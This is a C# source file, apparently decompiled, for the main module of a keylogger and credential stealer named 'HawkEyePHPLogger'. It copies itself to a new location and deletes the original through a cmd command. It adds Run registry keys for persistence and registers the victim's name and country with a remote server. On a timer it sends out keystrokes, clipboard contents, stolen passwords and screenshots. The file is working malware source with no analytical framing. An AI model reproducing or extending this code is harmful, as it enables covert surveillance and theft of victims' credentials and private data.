using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using JSONSerializer;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class HawkEyePHPLogger
{
	[STAThread]
	public static void Main()
	{
		API.InvokeMethods();
		if (Settings.Startup)
		{
			InitializeStartup();
		}
		if (Settings.Persistance)
		{
			if (InitializePersistance())
			{
				return;
			}
		}
		else
		{
			InitializeMutex();
		}
		InitializeUser();
		if (Settings.Keyboard)
		{
			KeyloggerHandler.InitializeKeylogger();
		}
		if (Settings.Clipboard)
		{
			ClipboardLoggerHandler.InitializeClipboardLogger();
		}
		InitializeLoop();
		Application.Run();
	}

	private static void InitializePinvoke()
	{
		API.InvokeMethods();
	}

	private static bool InitializePersistance()
	{
		Persistance persistance = new Persistance();
		persistance.SingleInstance();
		persistance.Interval = 100;
		persistance.Start();
		return persistance.IsWatcher;
	}

	private static void InitializeMutex()
	{
		using Mutex mutex = new Mutex(initiallyOwned: false, Settings.Mutex);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			mutex.Close();
			Environment.Exit(0);
		}
	}

	private static void InitializeStartup()
	{
		try
		{
			if (!File.Exists(Settings.Path + Application.get_ProductName() + ".exe"))
			{
				File.Copy(Application.get_ExecutablePath(), Settings.Path + Application.get_ProductName() + ".exe");
				Misc.ExecuteCMDCommand($"ping 1.1.1.1 -n 1 -w 1 > Nul & Del \"{Application.get_ExecutablePath()}\" & start \"\" \"{Settings.Path + Application.get_ProductName()}.exe\"");
				Environment.Exit(0);
			}
			if (ComputerInfo.IsAdministrator())
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Settings.Path + Application.get_ProductName() + ".exe");
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Settings.Path + Application.get_ProductName() + ".exe");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void InitializeUser()
	{
		Types.JSONObject jSONObject = new Types.JSONObject();
		Types.JSONObject jSONObject2 = jSONObject;
		jSONObject2.Add("name", ComputerInfo.FullName());
		jSONObject2.Add("country", ComputerInfo.TwoLetterCountryName());
		jSONObject2.Add("version", Settings.Version);
		jSONObject2 = null;
		Connection.SendCommand(Connection.CommandType.AddUser, jSONObject);
	}

	private static void InitializeLoop()
	{
		Thread thread = new Thread(MainLoop);
		thread.Start();
	}

	private static void MainLoop()
	{
		List<Logs.Log> list = new List<Logs.Log>();
		while (true)
		{
			Thread.Sleep(checked(Settings.Interval * 60000));
			List<Logs.Log> list2 = list;
			list2.Clear();
			if (Settings.Clipboard)
			{
				list2.Add(ClipboardLoggerHandler.SendClipLog());
			}
			if (Settings.Keyboard)
			{
				list2.Add(KeyloggerHandler.SendKeylog());
			}
			if (Settings.Stealer)
			{
				list2.Add(OtherHandlers.SendPasswords());
			}
			if (Settings.Screen)
			{
				list2.Add(OtherHandlers.SendScreenshot());
			}
			Logs.SendLogs(list2.ToArray());
			list2 = null;
		}
	}
}
